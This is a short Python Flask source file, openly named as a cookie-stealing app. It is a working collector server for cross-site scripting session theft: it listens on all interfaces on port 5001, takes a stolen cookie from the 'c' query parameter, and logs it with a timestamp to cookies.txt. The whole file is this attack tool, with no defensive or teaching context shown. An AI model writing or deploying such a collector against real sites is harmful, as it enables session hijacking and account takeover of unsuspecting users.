from flask import Flask, request, redirect
from datetime import datetime

stealing_cookie_app = Flask(__name__)

@stealing_cookie_app.route('/')
def cookie():
    cookie = request.args.get('c')
    f = open("cookies.txt", "a")
    if cookie:
        f.write(cookie + ' ' + str(datetime.now()) + '\n')
    else:
        f.write('No cookie found at ' + str(datetime.now()) + '\n')
    f.close()

    return '', 204

def run_stealing_cookie_app():
    stealing_cookie_app.run(host='0.0.0.0', port=5001)
